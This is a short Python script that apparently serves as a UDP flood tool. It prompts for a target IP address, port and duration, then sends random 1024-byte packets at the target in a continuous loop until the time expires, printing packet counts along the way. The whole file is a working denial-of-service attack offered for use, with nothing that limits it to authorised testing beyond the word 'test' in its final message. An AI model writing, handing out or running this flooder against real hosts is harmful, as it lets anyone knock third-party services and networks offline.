import socket
import random
import time

# Get input from user
target_ip = input("Enter target IP address: ").strip()
target_port = int(input("Enter target port (e.g., 80 or 443): ").strip())
duration = int(input("Enter duration in seconds: ").strip())

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_to_send = random._urandom(1024)  # 1024 bytes of random data

# Calculate end time
timeout = time.time() + duration

print(f"\n[!] Starting UDP flood to {target_ip}:{target_port} for {duration} seconds...\n")

packet_count = 0
try:
    while time.time() < timeout:
        sock.sendto(bytes_to_send, (target_ip, target_port))
        packet_count += 1
        if packet_count % 1000 == 0:
            print(f"Sent {packet_count} packets...")
except KeyboardInterrupt:
    print("\n[!] Attack stopped manually.")

print(f"\n[✓] UDP flood test completed. Total packets sent: {packet_count}")
